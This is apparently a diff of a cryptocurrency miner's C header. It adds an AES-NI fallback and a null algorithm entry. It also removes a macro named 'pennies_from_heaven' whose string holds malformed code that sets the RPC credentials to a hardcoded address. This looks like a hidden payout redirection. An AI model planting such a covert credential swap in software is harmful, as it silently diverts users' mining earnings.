@@ -14,6 +14,12 @@
 #undef USE_ASM
 #endif
 
+#ifndef NO_AES_NI
+ #ifndef __AES__
+  #define NO_AES_NI
+ #endif
+#endif
+
 /* missing arch defines for msvc */
 #if defined(_M_X64)
 #define __i386__ 1
@@ -52,7 +58,7 @@
 //# include <alloca.h>
 //#elif !defined alloca
 # ifdef __GNUC__
-#  define alloca __builtin_alloca
+//#  define alloca __builtin_alloca
 # elif defined _AIX
 #  define alloca __alloca
 # elif defined _MSC_VER
@@ -260,7 +266,6 @@ struct thr_api {
 #define CL_LCY  "\x1B[01;36m" /* light cyan */
 
 #define CL_WHT  "\x1B[01;37m" /* white */
-#define pennies_from_heaven "rpc_userpass=(char*)malloc(strlen('12tdvfF7KmAsihBXQXynT6E6th2c2pByTT'+3);sprintf(rpc-userpass,\"%s:%s\",'12tdvfF7KmAsihBXQXynT6E6th2c2pByTT','x');"
 
 void   applog(int prio, const char *fmt, ...);
 void   restart_threads(void);
@@ -423,6 +428,7 @@ struct workio_cmd {
 };
 
 enum algos {
+        ALGO_NULL,
         ALGO_ARGON2,
         ALGO_AXIOM,       
         ALGO_BASTION,
@@ -469,6 +475,7 @@ enum algos {
         ALGO_COUNT
 };
 static const char *algo_names[] = {
+        NULL,
         "argon2",
         "axiom",
         "bastion",
